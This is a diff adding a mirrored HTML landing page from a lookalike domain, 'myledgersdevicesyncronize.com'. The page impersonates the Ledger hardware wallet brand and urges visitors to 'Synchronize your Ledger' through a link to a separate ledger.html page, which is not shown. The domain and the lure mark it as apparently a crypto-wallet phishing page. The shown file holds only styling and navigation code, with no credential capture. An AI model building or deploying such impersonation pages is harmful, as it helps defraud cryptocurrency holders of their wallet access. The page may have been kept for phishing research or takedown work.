@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from myledgersdevicesyncronize.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Jul 2025 08:47:34 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Wallet</title>
+    <link href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <style>
+        /* Global Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+        
+        body {
+            background-color: #0a0a0a;
+            color: #fff;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        .image-container {
+    max-width: 300px;
+    margin: 20px auto;
+    border-radius: 20px;
+    overflow: hidden;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+  }
+
+  .image-container:hover {
+    transform: scale(1.03);
+    box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25);
+  }
+
+  .image-container img {
+    width: 100%;
+    height: auto;
+    display: block;
+    border-radius: inherit;
+  }
+        /* Header Styles */
+        header {
+            padding: 20px 0;
+        }
+        
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: bold;
+            font-size: 1.5rem;
+        }
+        
+        .logo img {
+            height: 32px;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .nav-links a {
+            color: #9ca3af;
+            text-decoration: none;
+            font-size: 0.95rem;
+            transition: color 0.3s;
+        }
+        
+        .nav-links a:hover {
+            color: #fff;
+        }
+        
+        .auth-buttons {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .auth-btn {
+            padding: 10px 20px;
+            border-radius: 999px;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .login-btn {
+            background-color: transparent;
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .login-btn:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+        
+        .register-btn {
+            background-color: #ff5e00;
+            color: #fff;
+            border: none;
+        }
+        
+        .register-btn:hover {
+            background-color: #e65400;
+        }
+        
+        /* Hero Section */
+        .hero {
+            padding: 80px 0 100px;
+            text-align: center;
+        }
+        
+        .hero h1 {
+            font-size: 4rem;
+            font-weight: 800;
+            margin-bottom: 20px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.1;
+        }
+        
+        .hero p {
+            font-size: 1.1rem;
+            color: #9ca3af;
+            margin-bottom: 40px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .cta-btn {
+            padding: 15px 30px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 999px;
+            background-color: #ff5e00;
+            color: #fff;
+            text-decoration: none;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: inline-block;
+        }
+        
+        .cta-btn:hover {
+            background-color: #e65400;
+        }
+        
+        .wallets-container {
+            margin-top: 80px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        
+        .wallet-option {
+            background-color: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 25px;
+            width: 280px;
+            text-align: left;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        
+        .wallet-option:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+            transform: translateY(-5px);
+        }
+        
+        .wallet-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
+        
+        .wallet-logo {
+            height: 36px;
+            width: auto;
+            border-radius: 8px;
+            background-color: #0a0a0a;
+            padding: 4px;
+        }
+        .discover-bt {
+  background: none;
+  border: none;
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+  text-decoration: underline;
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.discover-bt:hover {
+  color: #ccc;
+}
+.tagline {
+  background-color: #007BFF; /* Bootstrap-like blue */
+  font-weight: bold;
+  padding: 8px 16px;
+  display: inline-block;
+  border-radius: 6px;
+  font-size: 14px;
+  color: #fff;
+  margin-bottom: 10px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+
+        .popular-tag {
+            background-color: rgba(255, 94, 0, 0.15);
+            color: #ff5e00;
+            font-size: 0.75rem;
+            font-weight: bold;
+            padding: 4px 10px;
+            border-radius: 999px;
+        }
+        
+        .wallet-name {
+            font-weight: 600;
+            font-size: 1.1rem;
+            margin-bottom: 6px;
+        }
+        
+        .wallet-desc {
+            color: #9ca3af;
+            font-size: 0.9rem;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+        
+        .discover-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #ff5e00;
+            font-size: 0.9rem;
+            font-weight: 600;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+        }
+        
+        .discover-btn i {
+            font-size: 0.8rem;
+        }
+        
+        /* Mobile Responsive */
+        @media (max-width: 1024px) {
+            .wallets-container {
+                flex-wrap: wrap;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+            
+            .hero h1 {
+                font-size: 3rem;
+            }
+            
+            .wallets-container {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .wallet-option {
+                width: 100%;
+                max-width: 320px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            .auth-buttons {
+                gap: 10px;
+            }
+            
+            .auth-btn {
+                padding: 8px 15px;
+                font-size: 0.8rem;
+            }
+        }
+        
+        /* Mobile menu icon */
+        .mobile-menu {
+            display: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+        
+        @media (max-width: 768px) {
+            .mobile-menu {
+                display: block;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <nav>
+              <div class="logo">
+                    <img src="uploaad/ledger.svg" alt="Logo">
+                    <span></span>
+                </div>
+                <div class="nav-links">
+                </div>
+                <div class="mobile-menu">
+                    <i class="fas fa-bars"></i>
+                </div>
+            </nav>
+        </div>
+    </header>
+     <div class="image-container">
+            <img src="uploaad/ledg.png" alt="Premium Laptop with WalletX">
+        </div>
+    <section class="hero">
+        <div class="container">
+            <img src="uploaad/cryp.png" alt="Premium Laptop with WalletX">
+            <h1>Upgrade your crypto experience</h1>
+            <p>One secure platform to store, send and receive your crypto assets. Fast and secure transactions with minimal fees.</p>
+            <a href="ledger.html" class="cta-btn">Synchronize your Ledger <i class="fas fa-arrow-right"></i></a>
+            <button class="discover-bt" onclick="window.location.href='ledger.html'">
+                        Compare wallets 
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+            
+            <div class="wallets-container">
+                <div class="wallet-option" onclick="window.location.href='#ledger'">
+                    <div class="wallet-header">
+                        <img src="uploaad/ledger.svg" alt="Ledger" class="wallet-logo">
+                        <span class="popular-tag">POPULAR</span>
+                    </div>
+                    <h3 class="wallet-name">Ledger</h3>
+                    <p class="wallet-desc">The most secure hardware wallet for storing your crypto assets offline.</p>
+                    <button class="discover-btn" onclick="window.location.href='ledger.html'">
+                        Discover wallet 
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+                
+                <div class="wallet-option" onclick="window.location.href='#ledger'">
+                    <div class="wallet-header">
+                        <img src="../cdn.shopify.com/s/files/1/2974/4858/products/01_2_x7007185.png?v=1647271593" alt="MetaMask" class="wallet-logo">
+                    </div>
+                    <h3 class="wallet-name">MetaMask</h3>
+                    <p class="wallet-desc">The most popular browser extension wallet for Ethereum and ERC-20 tokens.</p>
+                    <button class="discover-btn" onclick="window.location.href='ledger.html'">
+                        Discover wallet 
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+                
+                <div class="wallet-option" onclick="window.location.href='#ledger'">
+                    <div class="wallet-header">
+                        <img src="../trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" class="wallet-logo">
+                    </div>
+                    <h3 class="wallet-name">Trust Wallet</h3>
+                    <p class="wallet-desc">Mobile wallet supporting a wide range of cryptocurrencies and DApps.</p>
+                    <button class="discover-btn" onclick="window.location.href='ledger.html'">
+                        Discover wallet 
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <script>
+        // Navigation links and Discover Wallet buttons leading to ledger page
+        document.querySelectorAll('.nav-links a, .discover-btn').forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                window.location.href = '#ledger';
+            });
+        });
+
+        // Making wallet options clickable to navigate to ledger page
+        document.querySelectorAll('.wallet-option').forEach(option => {
+            option.addEventListener('click', () => {
+                window.location.href = '#ledger';
+            });
+        });
+    </script>
+</body>
+
+<!-- Mirrored from myledgersdevicesyncronize.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Jul 2025 08:47:40 GMT -->
+</html>
